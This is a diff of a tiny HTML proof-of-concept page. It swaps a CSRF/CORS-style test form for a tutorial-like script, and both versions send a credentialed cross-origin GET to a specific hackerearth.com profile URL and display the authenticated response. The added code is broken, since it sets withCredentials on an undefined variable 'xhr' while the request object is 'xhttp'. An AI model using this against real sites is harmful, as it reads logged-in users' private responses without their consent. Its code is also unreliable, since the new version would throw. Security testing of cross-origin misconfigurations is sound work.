@@ -1,26 +1,26 @@
+<!DOCTYPE html>
 <html>
 <body>
-<script>history.pushState('', '', '/')</script>
+
+<div id="demo">
+<h1>The XMLHttpRequest Object</h1>
+<button type="button" onclick="loadDoc()">Change Content</button>
+</div>
+
 <script>
-  function submitRequest()
-  {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://www.hackerearth.com/@dr3dd1337", true);
-    xhr.withCredentials = true;
-    var body = "";
-    var aBody = new Uint8Array(body.length);
-    for (var i = 0; i < aBody.length; i++)
-      aBody[i] = body.charCodeAt(i);
-xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-        alert(xhr.response);
-        }
-} 
-    xhr.send(new Blob([aBody]));
-  }
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://www.hackerearth.com/@dr3dd1337", true);
+  xhr.withCredentials = true;
+  xhttp.send();
+}
 </script>
-<form action="#">
-  <input type="button" value="Submit request" onclick="submitRequest();" />
-</form>
+
 </body>
 </html>
